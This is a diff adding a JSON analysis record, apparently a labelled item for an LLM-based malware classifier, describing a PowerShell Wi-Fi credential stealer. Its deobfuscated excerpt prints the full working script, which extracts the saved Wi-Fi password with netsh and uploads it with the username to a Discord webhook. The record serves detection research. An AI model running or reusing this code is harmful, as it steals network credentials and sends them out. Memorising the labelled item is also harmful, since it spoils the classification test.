@@ -1,0 +1,102 @@
+{
+  "meta": {
+    "quelldatei": "tech_062_WiFiGrab.ps1",
+    "sha256": "75cd8be604202593bff06ca6cccb8085f1923735d1a3057055bda200f5f291ed",
+    "groesse_bytes": 1308,
+    "zeilen": 41,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "$networkName",
+      "Key Content",
+      ".*:\\s*(.*)",
+      "\r\n    $hostname = $env:COMPUTERNAME\r\n    $date = Get-Date -Format \"yyyyMMdd\"\r\n    $filename = \"$env:TEMP\\WiFiLoot-$hostname-$date.txt\"\r\n    $lootData = \"Network: $networkName`r`nPassword: $networkPassword\"\r\n    $lootData | Out-File -FilePath $filename\r\n    Write-Output \"Network details saved to: $filename\"\r\n}\r\n\r\nfunction Upload-Discord {\r\n    [CmdletBinding()]\r\n    param (\r\n        [parameter(Position=0,Mandatory=$False)]\r\n        [string]$file,\r\n\r\n        [parameter(Position=1,Mandatory=$False)]\r\n        [string]$text\r\n    )\r\n    \r\n    $hookurl = $hookurl\r\n    $Body = @{\r\n        ",
+      " = $env:username\r\n        ",
+      " = $text\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($text))){\r\n        Invoke-RestMethod -ContentType ",
+      " -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($file))){\r\n        curl.exe --insecure -F \"file1=@$file\" $hookurl\r\n    }\r\n}\r\n\r\nUpload-Discord -file \"$env:TEMP\\WiFiLoot-$env:COMPUTERNAME-$(Get-Date -Format "
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "$networkName",
+      "Key Content",
+      ".*:\\s*(.*)",
+      "\r\n    $hostname = $env:COMPUTERNAME\r\n    $date = Get-Date -Format \"yyyyMMdd\"\r\n    $filename = \"$env:TEMP\\WiFiLoot-$hostname-$date.txt\"\r\n    $lootData = \"Network: $networkName`r`nPassword: $networkPassword\"\r\n    $lootData | Out-File -FilePath $filename\r\n    Write-Output \"Network details saved to: $filename\"\r\n}\r\n\r\nfunction Upload-Discord {\r\n    [CmdletBinding()]\r\n    param (\r\n        [parameter(Position=0,Mandatory=$False)]\r\n        [string]$file,\r\n\r\n        [parameter(Position=1,Mandatory=$False)]\r\n        [string]$text\r\n    )\r\n    \r\n    $hookurl = $hookurl\r\n    $Body = @{\r\n        ",
+      " = $env:username\r\n        ",
+      " = $text\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($text))){\r\n        Invoke-RestMethod -ContentType ",
+      " -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($file))){\r\n        curl.exe --insecure -F \"file1=@$file\" $hookurl\r\n    }\r\n}\r\n\r\nUpload-Discord -file \"$env:TEMP\\WiFiLoot-$env:COMPUTERNAME-$(Get-Date -Format "
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Date",
+      "Get-NetConnectionProfile",
+      "Invoke-RestMethod",
+      "Out-File",
+      "Select-String",
+      "Upload-Discord",
+      "Write-Output"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:COMPUTERNAME",
+        "$env:TEMP\\WiFiLoot-$env:COMPUTERNAME-$(Get-Date",
+        "$env:TEMP\\WiFiLoot-$hostname-$date.txt",
+        "$env:username"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "$networkName",
+      "Key Content",
+      ".*:\\s*(.*)",
+      "\r\n    $hostname = $env:COMPUTERNAME\r\n    $date = Get-Date -Format \"yyyyMMdd\"\r\n    $filename = \"$env:TEMP\\WiFiLoot-$hostname-$date.txt\"\r\n    $lootData = \"Network: $networkName`r`nPassword: $networkPassword\"\r\n    $lootData | Out-File -FilePath $filename\r\n    Write-Output \"Network details saved to: $filename\"\r\n}\r\n\r\nfunction Upload-Discord {\r\n    [CmdletBinding()]\r\n    param (\r\n        [parameter(Position=0,Mandatory=$False)]\r\n        [string]$file,\r\n\r\n        [parameter(Position=1,Mandatory=$False)]\r\n        [string]$text\r\n    )\r\n    \r\n    $hookurl = $hookurl\r\n    $Body = @{\r\n        ",
+      " = $env:username\r\n        ",
+      " = $text\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($text))){\r\n        Invoke-RestMethod -ContentType ",
+      " -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($file))){\r\n        curl.exe --insecure -F \"file1=@$file\" $hookurl\r\n    }\r\n}\r\n\r\nUpload-Discord -file \"$env:TEMP\\WiFiLoot-$env:COMPUTERNAME-$(Get-Date -Format "
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Date",
+      "Get-NetConnectionProfile",
+      "Invoke-RestMethod",
+      "Out-File",
+      "Select-String",
+      "Upload-Discord",
+      "Write-Output"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:COMPUTERNAME",
+        "$env:TEMP\\WiFiLoot-$env:COMPUTERNAME-$(Get-Date",
+        "$env:TEMP\\WiFiLoot-$hostname-$date.txt",
+        "$env:username"
+      ]
+    },
+    "deobfuskiert_auszug": "$networkProfile = & { \r\n    $networkProfile = Get-NetConnectionProfile\r\n    $networkName = $networkProfile.Name\r\n    $networkPassword = (netsh wlan show profile name=\"$networkName\" key=clear | Select-String \"Key Content\").ToString() -replace \".*:\\s*(.*)\", '$1'\r\n    $hostname = $env:COMPUTERNAME\r\n    $date = Get-Date -Format \"yyyyMMdd\"\r\n    $filename = \"$env:TEMP\\WiFiLoot-$hostname-$date.txt\"\r\n    $lootData = \"Network: $networkNamernPassword: $networkPassword\"\r\n    $lootData | Out-File -FilePath $filename\r\n    Write-Output \"Network details saved to: $filename\"\r\n}\r\n\r\nfunction Upload-Discord {\r\n    [CmdletBinding()]\r\n    param (\r\n        [parameter(Position=0,Mandatory=$False)]\r\n        [string]$file,\r\n\r\n        [parameter(Position=1,Mandatory=$False)]\r\n        [string]$text\r\n    )\r\n    \r\n    $hookurl = $hookurl\r\n    $Body = @{\r\n        'username' = $env:username\r\n        'content' = $text\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($text))){\r\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)\r\n    }\r\n\r\n    if (-not ([string]::IsNullOrEmpty($file))){\r\n        curl.exe --insecure -F \"file1=@$file\" $hookurl\r\n    }\r\n}\r\n\r\nUpload-Discord -file \"$env:TEMP\\WiFiLoot-$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd').txt\"\r\n\r\nexit\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Web-Anfrage senden"
+    ]
+  }
+}
